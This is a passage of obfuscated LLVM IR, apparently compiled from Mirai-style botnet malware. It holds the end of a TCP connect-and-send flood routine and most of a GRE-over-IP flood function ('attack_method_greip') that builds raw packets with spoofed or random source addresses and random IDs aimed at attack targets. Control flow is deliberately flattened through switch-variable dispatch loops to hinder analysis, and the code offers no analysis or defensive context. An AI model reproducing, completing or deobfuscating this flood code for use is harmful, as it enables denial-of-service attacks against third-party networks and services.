  %123 = load %struct.sockaddr*, %struct.sockaddr** %122, align 8
  %124 = call i32 @bind(i32 %119, %struct.sockaddr* %123, i32 16) #6
  %125 = icmp eq i32 %124, -1
  %126 = select i1 %125, i32 1059403816, i32 2090523797
  store i32 %126, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  store i32 2090523797, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i64 %131
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i32 0, i32 2
  %134 = load i8, i8* %133, align 4
  %135 = zext i8 %134 to i32
  %136 = icmp slt i32 %135, 32
  %137 = select i1 %136, i32 987293414, i32 511869781
  store i32 %137, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  %139 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %140 = load i32, i32* %9, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i64 %141
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %142, i32 0, i32 1
  %144 = load i32, i32* %143, align 4
  %145 = call i32 @ntohl(i32 %144) #7
  %146 = call i32 @rand_next()
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 4
  %153 = zext i8 %152 to i32
  %154 = lshr i32 %146, %153
  %155 = add i32 %145, %154
  %156 = call i32 @htonl(i32 %155) #7
  %157 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %158 = load i32, i32* %9, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 0
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %161, i32 0, i32 2
  %163 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %162, i32 0, i32 0
  store i32 %156, i32* %163, align 4
  store i32 511869781, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i32*, i32** %11, align 8
  %166 = load i32, i32* %9, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i32, i32* %165, i64 %167
  %169 = load i32, i32* %168, align 4
  %170 = bitcast %union.__CONST_SOCKADDR_ARG* %22 to %struct.sockaddr**
  %171 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %172 = load i32, i32* %9, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i64 %173
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i32 0, i32 0
  %176 = bitcast %struct.sockaddr_in* %175 to %struct.sockaddr*
  store %struct.sockaddr* %176, %struct.sockaddr** %170, align 8
  %177 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %22, i32 0, i32 0
  %178 = load %struct.sockaddr*, %struct.sockaddr** %177, align 8
  %179 = call i32 @connect(i32 %169, %struct.sockaddr* %178, i32 16)
  %180 = icmp eq i32 %179, -1
  %181 = select i1 %180, i32 -650967486, i32 -2013905879
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  store i32 -2013905879, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  store i32 -134514549, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %9, align 4
  %186 = add nsw i32 %185, 1
  store i32 %186, i32* %9, align 4
  store i32 -76310779, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  store i32 1181979042, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1205976444, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i32, i32* %9, align 4
  %191 = load i8, i8* %5, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp slt i32 %190, %192
  %194 = select i1 %193, i32 -1615878649, i32 -2045518670
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %10, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds i8*, i8** %196, i64 %198
  %200 = load i8*, i8** %199, align 8
  store i8* %200, i8** %23, align 8
  %201 = load i8, i8* %15, align 1
  %202 = icmp ne i8 %201, 0
  %203 = select i1 %202, i32 -1211562806, i32 -930987092
  store i32 %203, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i8*, i8** %23, align 8
  %206 = load i16, i16* %14, align 2
  %207 = zext i16 %206 to i32
  call void @rand_str(i8* %205, i32 %207)
  store i32 -930987092, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i32*, i32** %11, align 8
  %210 = load i32, i32* %9, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds i32, i32* %209, i64 %211
  %213 = load i32, i32* %212, align 4
  %214 = load i8*, i8** %23, align 8
  %215 = load i16, i16* %14, align 2
  %216 = zext i16 %215 to i64
  %217 = call i64 @send(i32 %213, i8* %214, i64 %216, i32 16384)
  store i32 2025555077, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %9, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %9, align 4
  store i32 -1205976444, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  store i32 1181979042, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %221, %218, %208, %204, %195, %189, %188, %187, %184, %183, %182, %164, %138, %128, %127, %109, %100, %91, %82, %66, %60, %59, %56, %53, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 1458)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1647925722, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1647925722, label %first
    i32 1109438827, label %79
    i32 257554106, label %80
    i32 -1172042328, label %86
    i32 -1324268759, label %89
    i32 1063152555, label %90
    i32 412282129, label %96
    i32 -743430092, label %147
    i32 1026392013, label %151
    i32 423154145, label %201
    i32 -1272649025, label %205
    i32 -317950495, label %214
    i32 -409262623, label %220
    i32 1160537050, label %228
    i32 -1933746276, label %244
    i32 298462526, label %247
    i32 944966294, label %248
    i32 467811984, label %249
    i32 -296212201, label %255
    i32 -1372323198, label %284
    i32 374635815, label %305
    i32 -1592008236, label %309
    i32 2145122261, label %313
    i32 -1916597365, label %318
    i32 1281096883, label %333
    i32 1098722983, label %338
    i32 355046766, label %344
    i32 1746548167, label %349
    i32 -118164344, label %355
    i32 -1263108998, label %359
    i32 -1636870010, label %363
    i32 1330555931, label %369
    i32 1716351963, label %373
    i32 202755633, label %376
    i32 -693019687, label %443
    i32 -1369910851, label %446
    i32 915493889, label %447
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %77 = icmp eq i32 %.reload, -1
  %78 = select i1 %77, i32 1109438827, i32 257554106
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 915493889, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %81 = load i32, i32* %10, align 4
  %82 = bitcast i32* %9 to i8*
  %83 = call i32 @setsockopt(i32 %81, i32 0, i32 3, i8* %82, i32 4) #6
  %84 = icmp eq i32 %83, -1
  %85 = select i1 %84, i32 -1172042328, i32 -1324268759
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = call i32 @close(i32 %87)
  store i32 915493889, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1063152555, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %9, align 4
  %92 = load i8, i8* %5, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp slt i32 %91, %93
  %95 = select i1 %94, i32 412282129, i32 298462526
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = call noalias i8* @calloc(i64 1458, i64 8) #6
  %98 = load i8**, i8*** %11, align 8
  %99 = load i32, i32* %9, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8*, i8** %98, i64 %100
  store i8* %97, i8** %101, align 8
  %102 = load i8**, i8*** %11, align 8
  %103 = load i32, i32* %9, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8*, i8** %102, i64 %104
  %106 = load i8*, i8** %105, align 8
  %107 = bitcast i8* %106 to %struct.iphdr*
  store %struct.iphdr* %107, %struct.iphdr** %22, align 8
  %108 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %109 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %108, i64 1
  %110 = bitcast %struct.iphdr* %109 to %struct.grehdr*
  store %struct.grehdr* %110, %struct.grehdr** %23, align 8
  %111 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %112 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %111, i64 1
  %113 = bitcast %struct.grehdr* %112 to %struct.iphdr*
  store %struct.iphdr* %113, %struct.iphdr** %24, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i64 1
  %116 = bitcast %struct.iphdr* %115 to %struct.udphdr*
  store %struct.udphdr* %116, %struct.udphdr** %25, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %118 = bitcast %struct.iphdr* %117 to i8*
  %119 = load i8, i8* %118, align 4
  %120 = and i8 %119, 15
  %121 = or i8 %120, 64
  store i8 %121, i8* %118, align 4
  %122 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, -16
  %126 = or i8 %125, 5
  store i8 %126, i8* %123, align 4
  %127 = load i8, i8* %12, align 1
  %128 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 1
  store i8 %127, i8* %129, align 1
  %130 = load i32, i32* %18, align 4
  %131 = sext i32 %130 to i64
  %132 = add i64 52, %131
  %133 = trunc i64 %132 to i16
  %134 = call zeroext i16 @htons(i16 zeroext %133) #7
  %135 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 2
  store i16 %134, i16* %136, align 2
  %137 = load i16, i16* %13, align 2
  %138 = call zeroext i16 @htons(i16 zeroext %137) #7
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 3
  store i16 %138, i16* %140, align 4
  %141 = load i8, i8* %14, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 5
  store i8 %141, i8* %143, align 4
  %144 = load i8, i8* %15, align 1
  %145 = icmp ne i8 %144, 0
  %146 = select i1 %145, i32 -743430092, i32 1026392013
  store i32 %146, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 4
  store i16 %148, i16* %150, align 2
  store i32 1026392013, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 6
  store i8 47, i8* %153, align 1
  %154 = load i32, i32* %21, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 8
  store i32 %154, i32* %156, align 4
  %157 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %158 = load i32, i32* %9, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 1
  %162 = load i32, i32* %161, align 4
  %163 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 9
  store i32 %162, i32* %164, align 4
  %165 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %166 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %167 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %166, i32 0, i32 1
  store i16 %165, i16* %167, align 2
  %168 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %169 = bitcast %struct.iphdr* %168 to i8*
  %170 = load i8, i8* %169, align 4
  %171 = and i8 %170, 15
  %172 = or i8 %171, 64
  store i8 %172, i8* %169, align 4
  %173 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %174 = bitcast %struct.iphdr* %173 to i8*
  %175 = load i8, i8* %174, align 4
  %176 = and i8 %175, -16
  %177 = or i8 %176, 5
  store i8 %177, i8* %174, align 4
  %178 = load i8, i8* %12, align 1
  %179 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 1
  store i8 %178, i8* %180, align 1
  %181 = load i32, i32* %18, align 4
  %182 = sext i32 %181 to i64
  %183 = add i64 28, %182
  %184 = trunc i64 %183 to i16
  %185 = call zeroext i16 @htons(i16 zeroext %184) #7
  %186 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 2
  store i16 %185, i16* %187, align 2
  %188 = load i16, i16* %13, align 2
  %189 = zext i16 %188 to i32
  %190 = xor i32 %189, -1
  %191 = trunc i32 %190 to i16
  %192 = call zeroext i16 @htons(i16 zeroext %191) #7
  %193 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 3
  store i16 %192, i16* %194, align 4
  %195 = load i8, i8* %14, align 1
  %196 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 5
  store i8 %195, i8* %197, align 4
  %198 = load i8, i8* %15, align 1
  %199 = icmp ne i8 %198, 0
  %200 = select i1 %199, i32 423154145, i32 -1272649025
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 4
  store i16 %202, i16* %204, align 2
  store i32 -1272649025, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 6
  store i8 17, i8* %207, align 1
  %208 = call i32 @rand_next()
  %209 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 8
  store i32 %208, i32* %210, align 4
  %211 = load i8, i8* %20, align 1
  %212 = icmp ne i8 %211, 0
  %213 = select i1 %212, i32 -317950495, i32 -409262623
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 9
  %217 = load i32, i32* %216, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  store i32 1160537050, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 8
  %223 = load i32, i32* %222, align 4
  %224 = sub i32 %223, 1024
  %225 = xor i32 %224, -1
  %226 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  store i32 1160537050, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load i16, i16* %16, align 2
  %230 = call zeroext i16 @htons(i16 zeroext %229) #7
  %231 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %232 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %231, i32 0, i32 0
  store i16 %230, i16* %232, align 2
  %233 = load i16, i16* %17, align 2
  %234 = call zeroext i16 @htons(i16 zeroext %233) #7
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 1
  store i16 %234, i16* %236, align 2
  %237 = load i32, i32* %18, align 4
  %238 = sext i32 %237 to i64
  %239 = add i64 8, %238
  %240 = trunc i64 %239 to i16
  %241 = call zeroext i16 @htons(i16 zeroext %240) #7
  %242 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 2
  store i16 %241, i16* %243, align 2
  store i32 -1933746276, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i32, i32* %9, align 4
  %246 = add nsw i32 %245, 1
  store i32 %246, i32* %9, align 4
  store i32 1063152555, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  store i32 944966294, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 467811984, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i32, i32* %9, align 4
  %251 = load i8, i8* %5, align 1
  %252 = zext i8 %251 to i32
  %253 = icmp slt i32 %250, %252
  %254 = select i1 %253, i32 -296212201, i32 -1369910851
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i8**, i8*** %11, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds i8*, i8** %256, i64 %258
  %260 = load i8*, i8** %259, align 8
  store i8* %260, i8** %26, align 8
  %261 = load i8*, i8** %26, align 8
  %262 = bitcast i8* %261 to %struct.iphdr*
  store %struct.iphdr* %262, %struct.iphdr** %27, align 8
  %263 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i64 1
  %265 = bitcast %struct.iphdr* %264 to %struct.grehdr*
  store %struct.grehdr* %265, %struct.grehdr** %28, align 8
  %266 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %267 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %266, i64 1
  %268 = bitcast %struct.grehdr* %267 to %struct.iphdr*
  store %struct.iphdr* %268, %struct.iphdr** %29, align 8
  %269 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i64 1
  %271 = bitcast %struct.iphdr* %270 to %struct.udphdr*
  store %struct.udphdr* %271, %struct.udphdr** %30, align 8
  %272 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %273 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %272, i64 1
  %274 = bitcast %struct.udphdr* %273 to i8*
  store i8* %274, i8** %31, align 8
  %275 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %276 = load i32, i32* %9, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 2
  %280 = load i8, i8* %279, align 4
  %281 = zext i8 %280 to i32
  %282 = icmp slt i32 %281, 32
  %283 = select i1 %282, i32 -1372323198, i32 374635815
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 1
  %290 = load i32, i32* %289, align 4
  %291 = call i32 @ntohl(i32 %290) #7
  %292 = call i32 @rand_next()
  %293 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = lshr i32 %292, %299
  %301 = add i32 %291, %300
  %302 = call i32 @htonl(i32 %301) #7
  %303 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 9
  store i32 %302, i32* %304, align 4
  store i32 374635815, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i32, i32* %21, align 4
  %307 = icmp eq i32 %306, -1
  %308 = select i1 %307, i32 -1592008236, i32 2145122261
  store i32 %308, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = call i32 @rand_next()
  %311 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 8
  store i32 %310, i32* %312, align 4
  store i32 2145122261, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = load i16, i16* %13, align 2
  %315 = zext i16 %314 to i32
  %316 = icmp eq i32 %315, 65535
  %317 = select i1 %316, i32 -1916597365, i32 1281096883
  store i32 %317, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = call i32 @rand_next()
  %320 = and i32 %319, 65535
  %321 = trunc i32 %320 to i16
  %322 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 3
  store i16 %321, i16* %323, align 4
  %324 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 3
  %326 = load i16, i16* %325, align 4
  %327 = zext i16 %326 to i32
  %328 = sub nsw i32 %327, 1000
  %329 = xor i32 %328, -1
  %330 = trunc i32 %329 to i16
  %331 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 3
  store i16 %330, i16* %332, align 4
  store i32 1281096883, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i16, i16* %16, align 2
  %335 = zext i16 %334 to i32
  %336 = icmp eq i32 %335, 65535
  %337 = select i1 %336, i32 1098722983, i32 355046766
  store i32 %337, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = call i32 @rand_next()
  %340 = and i32 %339, 65535
  %341 = trunc i32 %340 to i16
